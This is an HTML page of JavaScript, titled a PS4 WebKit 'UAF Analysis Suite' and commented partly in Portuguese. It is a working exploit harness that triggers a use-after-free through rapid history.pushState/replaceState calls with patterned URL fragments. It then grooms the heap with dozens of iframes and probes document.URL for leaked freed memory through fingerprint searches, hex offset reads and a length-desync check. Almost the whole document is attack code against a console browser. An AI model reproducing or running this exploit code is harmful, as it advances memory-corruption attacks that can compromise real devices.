<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - UAF Analysis Suite</title>
<style>
    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
    button { 
        font-size:14px; padding:10px; margin:5px; 
        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer;
    }
    button:hover { background:#0f0; color:#000; }
    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
    .highlight { color: #fff; font-weight: bold; }
</style>
</head>
<body>
<h2>PS4 WebKit – UAF Analysis Suite</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runStepA()">1. FINGERPRINT CHECK</button>
<button onclick="runStepB()">2. WINDOWED READ (HEX)</button>
<button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// Gera padrões para identificar a memória (Passo A)
function getPattern(size, iter) {
    let char = String.fromCharCode(0x41 + (iter % 26)); // A, B, C...
    return char.repeat(size);
}

async function triggerBaseUAF() {
    logEl.textContent = "";
    statusEl.textContent = "Running UAF Phase...";
    log("=== STARTING STABLE UAF (i < 48) ===");

    let size = 977;
    const STEP = 14461;

    // Phase 1 – Fingerprinted UAF trigger
    for(let i=0; i<48; i++){
        let frag = getPattern(size, i); // Passo A: Inserindo marcas (A, B, C...)
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW OPEN (Waiting 120ms) <<<");
    await sleep(120);

    // Phase 2 – Document reuse (Heap Grooming)
    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>" + ("X".repeat(2048)) + "</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    frames = null;

    await sleep(80);
    statusEl.textContent = "UAF Triggered - Analyzing...";
}

// --- PASSO A: FINGERPRINTING ---
async function runStepA() {
    await triggerBaseUAF();
    log("\n[STEP A] Checking for Fingerprints...");
    
    let url = document.URL;
    let found = false;
    
    // Procura por sequências de AAAA, BBBB, CCCC...
    for(let i=0; i<26; i++) {
        let pattern = String.fromCharCode(0x41 + i).repeat(10);
        if(url.includes(pattern)) {
            log("FOUND PATTERN: " + pattern.substring(0,4) + "... em offset: " + url.indexOf(pattern));
            found = true;
        }
    }
    
    if(!found) log("No patterns found. Memory might be zeroed or differently mapped.");
    log("=== END STEP A ===");
}

// --- PASSO B: WINDOWED READ (PREVINE CRASH) ---
async function runStepB() {
    await triggerBaseUAF();
    log("\n[STEP B] Windowed Read (Hex Probing)...");
    
    const offsets = [0, 1000, 5000, 10000, 50000, 100000, 200000, 300000];
    let url = document.URL;
    
    log("URL Length: " + url.length);
    
    offsets.forEach(off => {
        if(off < url.length) {
            let code = url.charCodeAt(off);
            log("Offset [" + off + "]: 0x" + code.toString(16).toUpperCase() + " (" + String.fromCharCode(code) + ")");
        }
    });
    
    log("=== END STEP B ===");
}

// --- PASSO C: LAYOUT LOGIC ---
async function runStepC() {
    await triggerBaseUAF();
    log("\n[STEP C] Layout/Logic Collision Check...");
    
    let oldLen = document.URL.length;
    log("Current Length: " + oldLen);
    
    log("Setting small location.hash...");
    location.hash = "#TEST";
    
    await sleep(20);
    let newLen = document.URL.length;
    log("New Length: " + newLen);
    
    if(newLen > 1000 && location.hash === "#TEST") {
        log("CRITICAL: document.URL.length desincronizado com o hash real!");
        log("Isso confirma que o WebKit está lendo o buffer antigo (FREED).");
    } else {
        log("Length parece consistente.");
    }
    
    log("=== END STEP C ===");
}
</script>
</body>
</html>
